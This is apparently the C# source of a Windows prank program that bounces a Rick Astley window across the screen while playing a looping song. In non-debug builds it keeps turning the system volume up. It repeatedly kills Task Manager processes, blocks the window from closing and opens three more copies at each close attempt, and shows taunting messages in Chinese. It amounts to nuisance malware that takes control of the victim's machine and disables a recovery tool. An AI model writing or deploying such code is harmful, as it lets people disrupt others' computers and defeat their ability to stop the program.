using System;
using System.Diagnostics;
using System.Drawing;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using RickAstley.Properties;

namespace RickAstley {
    public partial class Form1 : Form {
        private const bool Debug = true;
        private readonly bool playsMusic = true;
        public Form1(bool music = true) {
            InitializeComponent();
            playsMusic = music;
        }

        private void Form1_Load(object sender, EventArgs e) {
            if (!Debug) {
                string sysroot = Environment.GetEnvironmentVariable("SYSTEMROOT");
                if (Application.ExecutablePath != sysroot + "\\rick.exe") Process.GetCurrentProcess().Kill();
            }
            lock (this) label1.Image = Resources.Astley;

            if (playsMusic) {
                try {
                    lock (this) {
                        SoundPlayer sp = new SoundPlayer(Resources.rick);
                        sp.PlayLooping();
                    }
                } catch { }
                button1.Visible = true;
            }

            CheckForIllegalCrossThreadCalls = false;

            Thread moveTh = new Thread(() => {
                int xOff = 5;
                int yOff = 5;
                int xPos = 0;
                int yPos = 0;
                Random random = new Random();
                while (true) {
                    if (playsMusic) {
                        if (!Debug) SendMessage(this.Handle, WM_APPCOMMAND, 0x30292, APPCOMMAND_VOLUME_UP * 0x10000);
                        try {
                            foreach(Process p in Process.GetProcessesByName("taskmgr")) p.Kill();
                        } catch { }
                    }

                    xPos += xOff;
                    yPos += yOff;

                    if (xPos > Screen.GetBounds(this).Width - this.Width) xOff = (int) (Math.Ceiling(-6 * random.NextDouble()) * 5 - 10);
                    if (xPos < 0) xOff = (int) (Math.Ceiling(7 * random.NextDouble()) * 5 - 10);

                    if (yPos > Screen.GetBounds(this).Height - this.Height) yOff = (int) (Math.Ceiling(-6 * random.NextDouble()) * 5 - 10);
                    if (yPos < 0) yOff = (int) (Math.Ceiling(7 * random.NextDouble()) * 5 - 10);

                    if (playsMusic) SetWindowPos(this.Handle, HWND_TOPMOST, xPos, yPos, 0, 0, SWP_SHOWWINDOW | SWP_NOSIZE);
                    else SetWindowPos(this.Handle, 0, xPos, yPos, 0, 0, SWP_NOZORDER | SWP_SHOWWINDOW | SWP_NOSIZE);
                    Thread.Sleep(1);
                }
            });
            moveTh.IsBackground = true;
            moveTh.Start();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e) {
            new Thread(() => {
                MessageBox.Show("别想关掉(doge)");
            }).Start();
            e.Cancel = true;
            for (int i = 0; i < 3; i++) {
                Form form = new Form1(false);
                form.Show();
            }
        }

        private void button1_MouseMove(object sender, MouseEventArgs e) {
            Random r = new Random();
            int x = r.Next(button1.Location.X - 28, button1.Location.X + 28);
            if (x > this.Width - button1.Width) x = this.Width - button1.Width;
            if (x < button1.Width) x = button1.Width;
            int y = r.Next(button1.Location.Y - 13, button1.Location.Y + 13);
            if (y > this.Height - button1.Height) y = this.Height - button1.Height;
            if (y < button1.Height) y = button1.Height;
            button1.Location = new Point(x, y);
        }

        private void button1_Click(object sender, EventArgs e) {
            new Thread(() => {
                MessageBox.Show("你 被 骗 了");
            }).Start();
        }

        #region

        [DllImport("user32.dll", EntryPoint = "SetWindowPos")]
        private static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SendMessage(IntPtr hWnd, uint msg, uint wParam, uint lParam);

        private const uint WM_APPCOMMAND = 0x319;
        private const uint APPCOMMAND_VOLUME_UP = 0x0a;
        private const int SWP_SHOWWINDOW = 0x0040;
        private const int SWP_NOSIZE = 1;
        private const int SWP_NOZORDER = 4;
        private const int HWND_TOPMOST = -1;

        #endregion
    }
}
